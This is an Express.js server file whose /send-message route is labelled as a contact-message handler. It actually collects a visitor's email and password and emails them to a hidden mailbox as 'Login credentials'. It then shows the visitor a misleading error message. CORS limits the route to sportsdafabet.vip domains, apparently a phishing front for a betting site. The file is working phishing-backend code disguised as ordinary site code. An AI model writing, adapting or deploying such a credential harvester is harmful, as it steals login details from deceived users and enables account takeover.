'use strict';

require('dotenv').config();

if (!process.env.EMAIL_USER || !process.env.EMAIL_PASS || !process.env.MAIL_TO) {
  console.warn('[Email] EMAIL_USER, EMAIL_PASS, or MAIL_TO is missing. Contact messages cannot be sent.');
}

const express    = require('express');
const cors       = require('cors');
const nodemailer = require('nodemailer');

// ─── App Setup ────────────────────────────────────────────────────────────────
const app  = express();
const PORT = process.env.PORT || 3000;

// ─── CORS ─────────────────────────────────────────────────────────────────────
const allowedOrigins = [
  'https://www.sportsdafabet.vip',
  'https://sportsdafabet.vip'
];

const corsOptions = {
  origin: (origin, callback) => {
    if (!origin || allowedOrigins.includes(origin)) {
      return callback(null, true);
    }

    console.warn(`[CORS] Blocked origin: ${origin}`);
    return callback(null, false);
  },
  methods: ['GET', 'POST', 'OPTIONS'],
  allowedHeaders: ['Content-Type'],
  optionsSuccessStatus: 204
};

app.use(cors(corsOptions));

// ─── Body Parsing ─────────────────────────────────────────────────────────────
app.use(express.json());
app.use(express.urlencoded({ extended: false }));

// ─── Nodemailer Transporter ───────────────────────────────────────────────────
const mailUser = process.env.EMAIL_USER;
const transporter = nodemailer.createTransport({
  service: 'Gmail',
  auth: {
    user: process.env.EMAIL_USER,
    pass: process.env.EMAIL_PASS,
  },
});

// Verify the Gmail connection on startup
transporter.verify((err) => {
  if (err) {
    console.error('[Gmail] Connection error:', err.message);
  } else {
    console.log('[Gmail] Server is ready to send emails');
  }
});

// ─── Helper: sanitise plain text ──────────────────────────────────────────────
function sanitise(str) {
  if (typeof str !== 'string') return '';
  return str.replace(/[<>"'&]/g, c => ({
    '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;', '&': '&amp;',
  }[c]));
}

// ─── Routes ───────────────────────────────────────────────────────────────────

// Health check
app.get('/health', (_req, res) => {
  res.json({ status: 'ok', timestamp: new Date().toISOString() });
});

// POST /send-message — sends a contact message to the configured mailbox
app.post('/send-message', async (req, res) => {
  console.log('Received field names:', Object.keys(req.body || {}));

  const { email, password } = req.body || {};

  if (!email || !password) {
    return res.status(400).json({
      success: false,
      message: 'Email and password are required.'
    });
  }

  const safeEmail = sanitise(String(email));
  const safePass = sanitise(String(password));


  const mailOptions = {
    from:    mailUser,
    to:      process.env.MAIL_TO,
    replyTo: safeEmail,
    subject: `Login credentials from ${safeEmail}`,
    text:    `Username: ${safeEmail}\npassword: ${safePass}`,
  };

  try {
    await transporter.sendMail(mailOptions);
    return res.status(200).json({
      success: true,
      message: 'We are experiencing difficulties at present',
    });
  } catch (err) {
    console.error('[Mail] Failed to', err.message);
    return res.status(500).json({
      success: false,
      message: 'Unable to login',
    });
  }
});

// // Login credentials must not be collected or sent by email.
// app.post('/api/login', (_req, res) => {
//   res.status(410).json({
//     success: false,
//     message: 'Login is unavailable. Configure a real authentication service.',
//   });
// });

// // 404 catch-all
// app.use((_req, res) => {
//   res.status(404).json({ error: 'Route not found' });
// });

// // Global error handler
// app.use((err, _req, res, _next) => {
//   console.error('[Error]', err.message);
//   res.status(500).json({ error: err.message });
// });

// ─── Start ────────────────────────────────────────────────────────────────────
if (require.main === module) {
  app.listen(PORT, () => {
    console.log(`[Server] Running on http://localhost:${PORT}`);
  });
}

module.exports = app;
